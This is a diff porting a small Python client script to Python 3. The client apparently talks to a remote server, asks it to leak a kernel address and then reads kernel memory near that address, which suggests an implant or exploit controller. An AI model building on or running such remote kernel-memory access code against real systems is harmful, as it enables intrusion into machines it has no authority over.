@@ -21,7 +21,7 @@ def startManage(sock_fd, logger):
     data = sendInstr(sock_fd, instrLeakAddr(), logger)
 
     leaked_addr = struct.unpack("<Q", data)[0]
-    logger.info("The leaked kernel address is: %016x" % (leaked_addr))
+    logger.info("The leaked kernel address is: %016x", leaked_addr)
 
     logger.info('Sending the memory read instruction')
     data = sendInstr(sock_fd, instrMemRead((leaked_addr - 0x1000) & (2 ** 64 - 1 - (0x1000 - 1)), 256), logger)
@@ -34,9 +34,9 @@ def startManage(sock_fd, logger):
 # Prints the usage instructions (example)
 ##
 def printUsage(args):
-    print 'Usage: %s <server_ip>' % (args[0])
-    print 'Exitting'
-    exit( 1 )
+    print('Usage: %s <server_ip>' % (args[0]))
+    print('Exitting')
+    exit(1)
 
 ##
 # Main function (example)
@@ -44,8 +44,8 @@ def printUsage(args):
 def main(args):
     # Check the arguments
     if len(args) != 1 + 1:
-        print 'Wrong amount of arguments, got %d, expected %d' % (len(args) - 1, 1)
-        printUsage( args )
+        print('Wrong amount of arguments, got %d, expected %d' % (len(args) - 1, 1))
+        printUsage(args)
 
     # parse the args
     server_ip = args[1]
